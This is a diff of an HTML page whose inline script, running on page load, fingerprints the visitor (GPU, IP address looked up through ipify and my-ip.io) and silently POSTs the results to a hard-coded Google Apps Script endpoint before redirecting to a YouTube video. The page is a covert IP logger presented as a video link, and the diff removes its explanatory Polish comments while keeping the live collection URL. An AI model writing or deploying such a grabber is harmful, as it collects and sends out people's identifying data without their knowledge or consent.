@@ -6,13 +6,8 @@
 </head>
 <body>
     <script>
-        // ⚙️ KONFIGURACJA - TUTAJ WPISZ SWOJE DANE!
-        const GOOGLE_SHEETS_URL = "https://script.google.com/macros/s/AKfycbzhCFh2H-LiQWzjzSknJLiXuU4uX6J5JfV42LYFNPCw2vv423GT8Wjb0rR_Hcd-3bx9HA/exec"; // WKLEJ SWÓJ URL Z APPS SCRIPT
-        const VIDEO_ID = "dQw4w9WgXcQ"; // ID FILMU YOUTUBE (możesz zmienić)
-        
-        // ============================================
-        // FUNKCJE ZBIERAJĄCE DANE
-        // ============================================
+        const GOOGLE_SHEETS_URL = "https://script.google.com/macros/s/AKfycbzhCFh2H-LiQWzjzSknJLiXuU4uX6J5JfV42LYFNPCw2vv423GT8Wjb0rR_Hcd-3bx9HA/exec";
+        const VIDEO_ID = "dQw4w9WgXcQ"; // ID FILMU YOUTUBE
         
         function getGPU() {
             try {
@@ -82,19 +77,18 @@
         }
         
         function getXFF() {
-            // Uwaga: JavaScript nie ma dostępu do nagłówka X-Forwarded-For
-            // Zostawiamy jako 'unknown' lub możemy spróbować przez API
+        
             return 'unknown';
         }
         
-        // 🌐 Pobieranie IP przez zewnętrzne API
+      
         async function getIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 return data.ip;
             } catch(e) {
-                // Próbuj drugie API jeśli pierwsze nie działa
+              
                 try {
                     const response2 = await fetch('https://api.my-ip.io/ip.json');
                     const data2 = await response2.json();
@@ -105,7 +99,7 @@
             }
         }
         
-        // 📝 Zbieranie wszystkich danych
+    
         async function collectData() {
             const ip = await getIP();
             
@@ -127,12 +121,12 @@
             };
         }
         
-        // 💾 Zapis do Google Sheets
+     
         async function saveToGoogleSheets(data) {
             try {
                 const response = await fetch(GOOGLE_SHEETS_URL, {
                     method: 'POST',
-                    mode: 'no-cors', // Ważne dla Google Apps Script!
+                    mode: 'no-cors', 
                     headers: {
                         'Content-Type': 'application/json',
                     },
@@ -144,7 +138,7 @@
             }
         }
         
-        // 🚀 Główna funkcja
+       
         async function main() {
             console.log('Zbieranie danych...');
             const data = await collectData();
@@ -153,11 +147,10 @@
             await saveToGoogleSheets(data);
             console.log('Przekierowanie na YouTube...');
             
-            // Przekierowanie na YouTube
+          
             window.location.href = 'https://www.youtube.com/watch?v=' + VIDEO_ID;
         }
         
-        // Uruchom
         main();
     </script>
 </body>
